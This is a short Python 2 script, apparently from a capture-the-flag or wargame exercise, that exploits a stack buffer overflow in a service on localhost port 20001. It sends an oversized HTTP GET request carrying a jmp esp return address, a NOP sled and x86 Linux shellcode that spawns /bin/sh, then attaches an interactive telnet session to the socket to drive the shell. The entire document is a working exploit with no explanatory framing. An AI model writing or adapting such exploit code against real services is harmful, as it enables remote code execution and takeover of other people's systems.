import socket
import sys 
import telnetlib

host = '127.0.0.1'
port = int(20001)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if s:
    s.connect((host, port))

    prefix   = 'GET '+'x'*139
    jmp_esp  = '\x4f\x9f\x04\x08'
    nopsled  = "\x90"*40
    sc       = '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
    suffix   = ' HTTP/1.1'
    payload = prefix + jmp_esp + nopsled + sc + suffix
    s.send(payload)

    # Thanks for the help Neg9 :)
    t = telnetlib.Telnet()
    t.sock = s 
    t.interact()
    s.recv(1024)

    '''
    #Or I can send single commands, but you have to comment the Telnet bit out then
    cmd = "/bin/pwd\n"
    s.send(cmd)
    print s.recv(1024)
    '''
else:
    print "Socket creation failed ffs"
    print sys.exc_info()
